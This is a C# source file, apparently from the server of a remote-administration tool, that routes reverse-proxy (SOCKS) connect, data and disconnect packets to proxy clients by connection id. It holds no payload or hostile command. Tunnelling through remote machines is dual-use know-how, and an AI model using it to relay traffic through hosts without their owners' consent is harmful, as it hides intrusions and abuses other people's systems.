using System;
using System.Collections.Generic;
using System.Text;
using xServer.Core.Packets;
using xServer.Core.ReverseProxy.Packets;

namespace xServer.Core.ReverseProxy
{
    public class ReverseProxyCommandHandler
    {
        public static void HandleCommand(Client client, IPacket Packet)
        {
            if (Packet as ReverseProxy_ConnectResponse != null)
            {
                ReverseProxy_ConnectResponse Response = Packet as ReverseProxy_ConnectResponse;
                if (client.Value.ProxyServer != null)
                {
                    ReverseProxyClient SocksClient = client.Value.ProxyServer.GetClientByConnectionId(Response.ConnectionId);
                    if (SocksClient != null)
                    {
                        SocksClient.CommandResponse(Response);
                    }
                }
            }
            else if (Packet as ReverseProxy_Data != null)
            {
                ReverseProxy_Data DataCommand = Packet as ReverseProxy_Data;
                ReverseProxyClient SocksClient = client.Value.ProxyServer.GetClientByConnectionId(DataCommand.ConnectionId);

                if (SocksClient != null)
                {
                    SocksClient.SendToClient(DataCommand.Data);
                }
            }
            else if (Packet as ReverseProxy_Disconnect != null)
            {
                ReverseProxy_Disconnect DisconnectCommand = Packet as ReverseProxy_Disconnect;
                ReverseProxyClient SocksClient = client.Value.ProxyServer.GetClientByConnectionId(DisconnectCommand.ConnectionId);

                if (SocksClient != null)
                {
                    SocksClient.Disconnect();
                }
            }
        }
    }
}